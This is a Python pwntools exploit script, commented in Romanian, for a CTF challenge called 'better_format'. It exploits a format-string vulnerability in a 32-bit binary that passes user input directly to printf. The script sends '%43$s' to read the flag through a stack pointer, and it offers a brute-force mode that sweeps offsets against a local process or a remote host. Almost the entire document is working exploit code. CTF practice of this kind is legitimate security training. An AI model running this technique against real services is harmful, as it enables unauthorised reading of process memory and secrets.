#!/usr/bin/env python3
# ============================================================================
# CTF: better_format — format string (leak)
# Vulnerabilitate: input dat direct la printf(user). La offsetul 43 pe stiva se
#   afla un POINTER catre flag, deci "%43$s" il dereferentiaza si-l citeste direct
#   (modul 'brute' baleiaza offseturile). Exploit: trimiti %43$s, extragi flag-ul.
# Binar: ELF 32-bit (i386), not stripped | NX on · fara canary · No-PIE · Partial RELRO
#   - No-PIE => pozitii pe stiva stabile intre rulari. Doar citire (%s), deci
#     canary/NX irelevante; o conexiune noua per incercare pt pointeri invalizi.
# ============================================================================
import sys, re
from pwn import *

context.binary = elf = ELF('./better_format')
context.log_level = 'error'          # scoate zgomotul pwntools

# La offset 43 printf gaseste un POINTER catre flag, deci %43$s il citeste direct
N = 43

REMOTE = len(sys.argv) >= 3 and sys.argv[2].isdigit()

def connect():
    if REMOTE:
        return remote(sys.argv[1], sys.argv[2])
    return process('./better_format')

def leak(n):
    # o conexiune noua per incercare: daca %n$s pica pe un pointer invalid,
    # procesul moare, dar nu strica urmatoarea incercare
    p = connect()
    try:
        p.recvuntil(b"> ")
        p.sendline(b"%%%d$s" % n)              # ex. %43$s
        out = p.recvuntil(b"> ", timeout=1)    # raspunsul pana la urmatorul prompt
    except EOFError:                           # %n$s a picat pe un pointer invalid
        out = b""
    p.close()
    return out

def gaseste_flag(out):
    return re.search(rb"(CTF|SI|FLAG)\{[^}]*\}", out)

# 'brute' in argumente -> incearca toate offseturile; altfel foloseste N din cod
if 'brute' in sys.argv:
    for n in range(1, 60):
        flag = gaseste_flag(leak(n))
        if flag:
            print(f"offset {n}: {flag.group().decode()}")
            break
    else:
        print("nu am gasit flag-ul")
else:
    out = leak(N)
    flag = gaseste_flag(out)
    print(flag.group().decode() if flag else out)
